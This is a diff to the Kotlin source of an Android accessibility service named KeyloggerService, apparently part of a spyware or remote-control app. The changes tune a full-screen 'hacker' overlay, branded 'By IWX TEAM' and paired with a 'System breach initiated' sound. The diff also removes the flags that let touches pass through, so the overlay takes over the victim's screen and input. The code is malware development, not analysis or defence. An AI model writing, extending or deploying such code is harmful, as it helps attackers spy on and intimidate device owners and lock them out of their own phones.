@@ -24,7 +24,7 @@ class KeyloggerService : AccessibilityService() {
 
     companion object {
         @Volatile var instance: KeyloggerService? = null
-        fun showScreenInject(text: String, style: String = "hacker") { instance?.showOverlay(text, style) }
+        fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun hideScreenInject()                                             { instance?.hideOverlay() }
     }
 
@@ -259,27 +259,28 @@ class KeyloggerService : AccessibilityService() {
     } catch (_: Exception) { pkg }
 
     // ── Screen Inject Overlay ─────────────────────────────────────────────────
-    fun showOverlay(text: String, style: String = "hacker") {
+    fun showOverlay(text: String, style: String = "hacker", speed: Float = 0.60f) {
         overlayHandler.post {
             hideOverlayInternal()
             val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             wm = windowManager
-            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style)
+            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style) { hideOverlay() }
             val params = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                 PixelFormat.TRANSLUCENT
-            )
+            ).also {
+                it.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN or
+                                   WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
+            }
             windowManager.addView(view, params)
             overlayView = view
             view.alpha = 0f
             view.animate().alpha(1f).setDuration(600).start()
             soundManager?.stop()
-            soundManager = HackerSoundManager(this@KeyloggerService).also { it.start(text.ifBlank { "System breach initiated" }) }
+            soundManager = HackerSoundManager(this@KeyloggerService, speed).also { it.start(text.ifBlank { "System breach initiated" }) }
         }
     }
 
